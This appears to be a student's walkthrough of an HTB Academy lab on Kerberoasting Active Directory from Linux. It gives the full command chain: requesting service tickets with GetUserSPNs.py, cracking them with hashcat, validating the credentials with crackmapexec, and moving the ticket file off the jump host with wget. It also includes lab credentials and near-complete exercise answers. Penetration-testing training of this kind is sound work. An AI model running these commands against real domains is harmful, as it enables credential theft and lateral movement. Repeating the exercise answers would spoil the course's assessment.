### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: Kerberoasting: from Linux <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Kerberoasting Overview

Service Principal Names (SPNs) map services to accounts. Any domain user can request a TGS for an SPN-bound account. The TGS-REP is encrypted with the account's NTLM hash → crackable offline with hashcat -m 13100.

Service accounts often have admin privs across multiple servers and weak/static passwords → cracked TGS = often immediate lateral/vertical movement, sometimes DA.

Even with a low-priv result, you can often abuse the SPN's service directly (e.g., MSSQL/SRV01 → enable xp_cmdshell → SYSTEM).

Run from:
- Non-domain-joined Linux with domain creds (Impacket)
- Domain-joined Linux with keytab
- Domain-joined Windows as user / shell / SYSTEM
- Non-domain Windows via `runas /netonly`

Tools: `GetUserSPNs.py`, `setspn.exe + Mimikatz`, `PowerView`, `Rubeus`.

Note: cracking is slow vs NTLM. Strong passwords may resist any reasonable wordlist: drop finding to medium-risk if uncrackable.

<br>

---

<br>

### Performing the Attack with GetUserSPNs.py

Install Impacket (already present on lab Parrot host):

```diff
+ $ sudo python3 -m pip install .
```

<br>

List all SPN accounts:

```diff
+ $ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

<br>

Request all TGS tickets:

```diff
+ $ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

<br>

Target a single user + write to file for offline cracking:

```diff
+ $ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

<br>

Crack with hashcat mode 13100:

```diff
+ $ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

<br>

Validate cracked creds:

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

<br>

---

<br>

### Kerberoasting from Linux Exercise

IP: 10.129.219.51

SSH `htb-student:HTB_@cademy_stdnt!`.

---

### Question 1:
Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.

#### SSH in, run GetUserSPNs to list SPNs and request the SAPService ticket.

```diff
+ $ ssh htb-student@10.129.219.51
+ $ /opt/impacket/examples/GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+ $ /opt/impacket/examples/GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sapserv_tgs
```

<br>

Stand up a quick Python server on the jump host, pull the file from the attack box, crack with hashcat:

```diff
+ $ python3 -m http.server 4469
```

<br>

```diff
+ $ wget http://10.129.219.51:4469/sapserv_tgs
+ $ hashcat -m 13100 sapserv_tgs rockyou.txt --force
```

	$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$cb40f...:!SapperFi2

&#x1F6A9; found **!Sappe--edit--Fi2**.

---

### Question 2:
What powerful local group on the Domain Controller is the SAPService user a member of?

#### From the GetUserSPNs output's MemberOf field.

	SAPService   CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL

&#x1F6A9; found **Account Operators**.
